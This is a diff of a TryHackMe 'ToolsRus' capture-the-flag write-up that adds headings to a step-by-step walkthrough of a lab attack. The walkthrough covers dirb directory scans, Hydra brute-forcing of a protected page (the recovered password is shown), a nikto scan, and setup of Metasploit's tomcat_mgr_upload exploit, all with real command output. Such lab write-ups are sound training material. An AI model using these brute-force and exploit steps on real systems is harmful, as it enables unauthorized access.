@@ -54,7 +54,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds
 ```
 
 #
-> Scanning for Web Directories Using Dirb
+> Scanning for Hidden Web Directories Using Dirb on Port 80 (Default)
 4. `dirb http://{TARGET IP} -r > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
 5. `cat {FILENAME2}.txt` to output the scan results from the previous command onto our terminal
 ```bash
@@ -89,7 +89,7 @@ DOWNLOADED: 4612 - FOUND: 3
 ```
 
 #
->
+> Visiting the Hidden Web Directories 
 6. `firefox "http://{TARGET IP}/guidelines` to launch Firefox and redirect it to the target's **/guidelines** page, which displayed a message that contained the name of one of the target's staff members
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Guidelines.png) 
@@ -100,6 +100,8 @@ DOWNLOADED: 4612 - FOUND: 3
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Protected%20(Unauthorized).png)
 
+#
+> Password Guessing Using Hydra
 8. `hydra -l {USER} -P {WORDLIST PATH} http-get://{ATTACK IP}/{PROTECTED DIRECTORY}` to try to guess the password of the user that we discovered in the **/guidelines** page, which ended up working in the end 
 ```bash
 root@ip-10-10-171-134:~# hydra -l bob -P ~/Tools/wordlists/rockyou.txt http-get://10.10.199.35/protected
@@ -113,12 +115,16 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2023-07-01 23:43:50
 Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-01 23:43:53
 ```
 
+# 
+> Accessing the Protected Hidden Directory
 9. `firefox "http://{TARGET IP}/protected` to relaunch Firefox and redirect it back to the target's **/protected** page and log in using the set of credentials that we now have, but when logged in, we receive a message saying that the page has moved to a different port
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Log%20Into%20Protected.png)
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Page%20Moved%20to%20Different%20Port.png)
 
+#
+> Scanning for Hidden Web Directories Using Dirb on Port 1234
 10. `dirb http://{TARGET IP}:1234 -r > {FILENAME3}` to non-recursively scan the target's other web server that's running on a higher port for directories using Dirb's default wordlist and then redirecting the results into a text file
 11. `cat {FILENAME3}` to output the scan results from the previous command onto our terminal
 ```bash
@@ -152,12 +158,17 @@ GENERATED WORDS: 4612
 END_TIME: Sun Jul  2 00:26:42 2023
 DOWNLOADED: 4612 - FOUND: 5
 ```
-12. `firefox "http://{TARGET IP}:1234/manager"` to launch Firefox and redirect it to the target's Tomcat **/manager** page using the set of credentials that we previously found
+
+#
+> Accessing the Tomcat's Web Manager Interface 
+12. `firefox "http://{TARGET IP}:1234/manager"` to launch Firefox and redirect it to the target's Tomcat **/manager** page and log in using the set of credentials that we previously found
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Log%20Into%20Protected.png)
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Manager%20Logged%20In.png)
 
+#
+> Scanning for Web Vulnerability Using Nikto
 13. `nikto -id {USER:PASSWORD} -host http://{TARGET IP}:1234/manager/html` to scan for potential web vulnerabilities on the target host while focusing at uncovering potential security weaknesses that could lead to unauthaurized disclosure of sensitive data using the provided ID credentials
 ```bash
 root@ip-10-10-171-134:~# nikto -id bob:bubbles -host http://10.10.199.35:1234/manager/html
@@ -186,6 +197,8 @@ root@ip-10-10-171-134:~# nikto -id bob:bubbles -host http://10.10.199.35:1234/ma
 + 1 host(s) tested
 ```
 
+# Vulnerability Identification
+> Vulnerability Identification Using Metasploit
 14. `msfconsole` to launch the Metasploit Framework on our attack machine
 15. `search Apache Tomcat` to search for Apache Tomcat exploit modules, which revealed 32 exploit modules related to Apache Tomcat but the one we were really interested in was the **tomcat_mgr_upload** module
 16. `info {EXPLOIT PATH}` to output more detail about the **tomcat_mgr_upload** module onto our terminal 
@@ -353,6 +366,9 @@ References:
 
 View the full module info with the info -d command.
 ```
+
+# Vulnerability Exploitation
+> Vulnerability Exploitation Usnig Metasploit
 17. `use {EXPLOIT PATH}` to load the **tomcat_mgr_upload** for further configuration and execution
 18. `show options` to display the available and required options and their current values
 19. `set HttpPassword {USER'S PASSWORD}` to set the value of the **HttpPassword** variable to the user's password that we guessed using Hydra
